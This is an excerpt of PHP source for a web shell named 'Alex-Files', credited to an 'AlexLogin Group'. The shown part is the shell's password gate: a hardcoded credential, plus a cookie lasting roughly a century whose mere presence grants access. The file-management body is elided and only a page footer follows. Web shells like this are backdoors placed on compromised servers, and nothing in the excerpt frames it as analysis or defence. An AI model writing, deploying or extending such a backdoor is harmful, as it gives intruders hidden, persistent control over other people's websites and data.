...
$logins = array('Alex' => 'c1b9147aaff02e377f9869e9f2d81c6a');
$Username = isset($_POST['Username']) ? $_POST['Username'] : '';
$Password = isset($_POST['Password']) ? $_POST['Password'] : '';
if (isset($logins[$Username]) && $logins[$Username] == $Password){
$_SESSION['UserData']['Username']=$logins[$Username];
setcookie('AlexData', $_SESSION['UserData']['Username'], time() + (86400 * 365 * 100), "/");
header('Location: '.$_SERVER['PHP_SELF']);
exit;
}
}
if(!isset($_SESSION['UserData']['Username']) && !isset($_COOKIE['AlexData'])){
exit;
}
$shellName = 'Alex-Files';
	...
	<div class="container-lg">
		...
		<div class="row">
			...
			<div class="col-md-12 my-3">
				<div class="card border-dark">
					<div class="card-body">
						Copyright © Alex-Files <span class="float-end">Coded by <span class="text-muted">AlexLogin Group</span></span>
					</div>
				</div>
			</div>
		</div>
